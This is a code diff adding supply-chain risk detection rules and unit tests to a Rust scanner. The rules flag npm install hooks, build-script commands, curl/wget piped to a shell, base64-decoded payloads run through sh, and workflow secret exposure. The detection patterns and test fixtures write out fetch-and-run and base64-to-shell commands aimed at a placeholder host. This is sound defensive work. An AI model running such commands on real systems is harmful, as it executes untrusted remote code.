@@ -73,6 +73,27 @@ struct AstLocationRow {
     text: String,
 }
 
+struct RowRiskContext {
+    package_json: bool,
+    build_script: bool,
+    github_workflow: bool,
+    workflow_has_secret: bool,
+}
+
+impl RowRiskContext {
+    fn new(row: &AstRow) -> Self {
+        Self {
+            package_json: is_package_json_path(&row.path),
+            build_script: is_build_script_path(&row.path),
+            github_workflow: is_github_workflow_path(&row.path),
+            workflow_has_secret: row
+                .locations
+                .iter()
+                .any(|loc| contains_workflow_secret(&loc.text)),
+        }
+    }
+}
+
 pub fn findings_json_from_seed(seed: &str) -> String {
     let findings = findings_from_seed(seed);
     serde_json::to_string_pretty(&findings).unwrap_or_else(|_| "[]".to_string())
@@ -102,14 +123,24 @@ pub fn findings_from_seed(seed: &str) -> Vec<RiskFinding> {
         let Ok(row) = serde_json::from_str::<AstRow>(line) else {
             continue;
         };
+        let ctx = RowRiskContext::new(&row);
 
         if row.locations.is_empty() {
             for call in row.calls {
                 push_call_risk(&mut out, &mut seen, &row.path, None, &call);
+                push_supply_chain_risks(&mut out, &mut seen, &row.path, None, &call, &ctx);
             }
         }
 
         for loc in &row.locations {
+            push_supply_chain_risks(
+                &mut out,
+                &mut seen,
+                &row.path,
+                Some(loc.line),
+                &loc.text,
+                &ctx,
+            );
             match loc.kind.as_str() {
                 "call" => push_call_risk(&mut out, &mut seen, &row.path, Some(loc.line), &loc.text),
                 "signature" => {
@@ -402,9 +433,233 @@ fn push_call_risk(
     }
 }
 
+fn push_supply_chain_risks(
+    out: &mut Vec<RiskFinding>,
+    seen: &mut BTreeSet<String>,
+    path: &str,
+    line: Option<usize>,
+    text: &str,
+    ctx: &RowRiskContext,
+) {
+    if ctx.package_json && is_npm_lifecycle_script(text) {
+        push_unique(
+            out,
+            seen,
+            RiskFinding {
+                severity: Severity::High,
+                path: path.to_string(),
+                line,
+                rule: "npm-lifecycle-script".to_string(),
+                title: "NPM lifecycle script executes during install".to_string(),
+                evidence: sanitize_evidence(text),
+            },
+        );
+    }
+
+    if ctx.build_script && looks_like_subprocess_or_shell(text) {
+        push_unique(
+            out,
+            seen,
+            RiskFinding {
+                severity: Severity::High,
+                path: path.to_string(),
+                line,
+                rule: "rust-build-script-command".to_string(),
+                title: "Rust build script invokes a command boundary".to_string(),
+                evidence: sanitize_evidence(text),
+            },
+        );
+    }
+
+    if looks_like_download_execute(text) {
+        push_unique(
+            out,
+            seen,
+            RiskFinding {
+                severity: Severity::High,
+                path: path.to_string(),
+                line,
+                rule: "download-execute".to_string(),
+                title: "Downloaded content is executed or made executable".to_string(),
+                evidence: sanitize_evidence(text),
+            },
+        );
+    }
+
+    if looks_like_base64_execute(text) {
+        push_unique(
+            out,
+            seen,
+            RiskFinding {
+                severity: Severity::High,
+                path: path.to_string(),
+                line,
+                rule: "base64-execute".to_string(),
+                title: "Base64-decoded content flows into execution".to_string(),
+                evidence: sanitize_evidence(text),
+            },
+        );
+    }
+
+    if looks_like_dynamic_shell_eval(text) {
+        push_unique(
+            out,
+            seen,
+            RiskFinding {
+                severity: Severity::Medium,
+                path: path.to_string(),
+                line,
+                rule: "dynamic-shell-eval".to_string(),
+                title: "Dynamic shell evaluation requires manual review".to_string(),
+                evidence: sanitize_evidence(text),
+            },
+        );
+    }
+
+    if ctx.github_workflow
+        && (contains_workflow_secret(text) || (ctx.workflow_has_secret && is_run_line(text)))
+    {
+        push_unique(
+            out,
+            seen,
+            RiskFinding {
+                severity: Severity::Medium,
+                path: path.to_string(),
+                line,
+                rule: "workflow-secret-shell".to_string(),
+                title: "GitHub Actions shell path is coupled to secrets".to_string(),
+                evidence: sanitize_evidence(text),
+            },
+        );
+    }
+
+    if ctx.github_workflow && is_unpinned_action_use(text) {
+        push_unique(
+            out,
+            seen,
+            RiskFinding {
+                severity: Severity::Medium,
+                path: path.to_string(),
+                line,
+                rule: "unpinned-github-action".to_string(),
+                title: "GitHub Action reference is not pinned to a commit SHA".to_string(),
+                evidence: sanitize_evidence(text),
+            },
+        );
+    }
+}
+
 fn is_panic_edge_call(call: &str) -> bool {
     let unwrap_like = call.contains(".unwrap") && !call.contains(".unwrap_or");
     unwrap_like || call.contains(".expect")
+}
+
+fn is_package_json_path(path: &str) -> bool {
+    normalized_path(path).ends_with("/package.json") || normalized_path(path) == "package.json"
+}
+
+fn is_build_script_path(path: &str) -> bool {
+    normalized_path(path).ends_with("/build.rs") || normalized_path(path) == "build.rs"
+}
+
+fn is_github_workflow_path(path: &str) -> bool {
+    let path = normalized_path(path);
+    path.contains("/.github/workflows/") || path.starts_with(".github/workflows/")
+}
+
+fn normalized_path(path: &str) -> String {
+    path.replace('\\', "/")
+}
+
+fn is_npm_lifecycle_script(text: &str) -> bool {
+    [
+        "preinstall",
+        "install",
+        "postinstall",
+        "prepare",
+        "prepack",
+        "postpack",
+    ]
+    .iter()
+    .any(|key| text.contains(&format!("\"{key}\"")) && text.contains(':'))
+}
+
+fn looks_like_subprocess_or_shell(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("std::process::command")
+        || lower.contains("command::new")
+        || lower.contains("process::command")
+        || lower.contains("shell")
+        || lower.contains("cmd")
+}
+
+fn looks_like_download_execute(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    let downloads = lower.contains("curl") || lower.contains("wget");
+    downloads
+        && (lower.contains("| sh")
+            || lower.contains("|sh")
+            || lower.contains("| bash")
+            || lower.contains("|bash")
+            || lower.contains("bash -c")
+            || lower.contains("sh -c")
+            || lower.contains("chmod +x")
+            || lower.contains("&& ./")
+            || lower.contains("; ./"))
+}
+
+fn looks_like_base64_execute(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("base64")
+        && (lower.contains("-d") || lower.contains("--decode"))
+        && (lower.contains("| sh")
+            || lower.contains("|sh")
+            || lower.contains("| bash")
+            || lower.contains("|bash")
+            || lower.contains("bash -c")
+            || lower.contains("sh -c")
+            || lower.contains("eval"))
+}
+
+fn looks_like_dynamic_shell_eval(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("eval ") || lower.contains("eval(") || lower.contains("bash -c")
+}
+
+fn contains_workflow_secret(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("secrets.") || lower.contains("secrets[")
+}
+
+fn is_run_line(text: &str) -> bool {
+    text.trim_start().starts_with("run:")
+}
+
+fn is_unpinned_action_use(text: &str) -> bool {
+    let trimmed = text.trim_start();
+    if !trimmed.starts_with("uses:") {
+        return false;
+    }
+    let Some((_, reference)) = trimmed.split_once('@') else {
+        return true;
+    };
+    !is_full_sha(reference.trim())
+}
+
+fn is_full_sha(reference: &str) -> bool {
+    reference.len() == 40 && reference.chars().all(|c| c.is_ascii_hexdigit())
+}
+
+fn sanitize_evidence(text: &str) -> String {
+    let mut evidence: String = text.chars().take(160).collect();
+    for token in
+        text.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.'))
+    {
+        if token.to_ascii_lowercase().starts_with("secrets.") {
+            evidence = evidence.replace(token, "secrets.<redacted>");
+        }
+    }
+    evidence
 }
 
 fn push_unique(out: &mut Vec<RiskFinding>, seen: &mut BTreeSet<String>, finding: RiskFinding) {
@@ -504,6 +759,84 @@ mod tests {
                 .markdown
                 .contains("coverage requires review: read_failed=1")
         );
+    }
+
+    #[test]
+    fn flags_npm_lifecycle_download_execute() {
+        let seed = r#"{"path":"package.json","locations":[{"kind":"call","line":4,"text":"\"postinstall\": \"curl https://example.invalid/install.sh | sh\""}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(findings.iter().any(|f| {
+            f.rule == "npm-lifecycle-script" && f.severity == Severity::High && f.line == Some(4)
+        }));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule == "download-execute" && f.severity == Severity::High)
+        );
+    }
+
+    #[test]
+    fn flags_rust_build_script_command() {
+        let seed = r#"{"path":"build.rs","locations":[{"kind":"call","line":7,"text":"std::process::Command::new"}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(findings.iter().any(|f| {
+            f.rule == "rust-build-script-command"
+                && f.severity == Severity::High
+                && f.line == Some(7)
+        }));
+    }
+
+    #[test]
+    fn flags_dockerfile_download_execute() {
+        let seed = r#"{"path":"Dockerfile","locations":[{"kind":"call","line":3,"text":"RUN curl https://example.invalid/install.sh | bash"}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(findings.iter().any(|f| {
+            f.rule == "download-execute" && f.severity == Severity::High && f.line == Some(3)
+        }));
+    }
+
+    #[test]
+    fn flags_workflow_secret_shell_and_redacts_secret_name() {
+        let seed = r#"{"path":".github/workflows/release.yml","locations":[{"kind":"signature","line":10,"text":"run: |"},{"kind":"signature","line":11,"text":"TOKEN: ${{ secrets.RELEASE_TOKEN }}"}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(findings.iter().any(|f| {
+            f.rule == "workflow-secret-shell"
+                && f.severity == Severity::Medium
+                && f.evidence.contains("secrets.<redacted>")
+        }));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.evidence.contains("RELEASE_TOKEN"))
+        );
+    }
+
+    #[test]
+    fn flags_unpinned_github_actions() {
+        let seed = r#"{"path":".github/workflows/ci.yml","locations":[{"kind":"signature","line":7,"text":"uses: actions/checkout@v4"},{"kind":"signature","line":8,"text":"uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert_eq!(
+            findings
+                .iter()
+                .filter(|f| f.rule == "unpinned-github-action")
+                .count(),
+            1
+        );
+    }
+
+    #[test]
+    fn flags_base64_decode_execution() {
+        let seed = r#"{"path":"install.sh","locations":[{"kind":"call","line":2,"text":"echo d2hvYW1p | base64 -d | sh"}]}"#;
+        let findings = findings_from_seed(seed);
+
+        assert!(findings.iter().any(|f| {
+            f.rule == "base64-execute" && f.severity == Severity::High && f.line == Some(2)
+        }));
     }
 
     #[test]
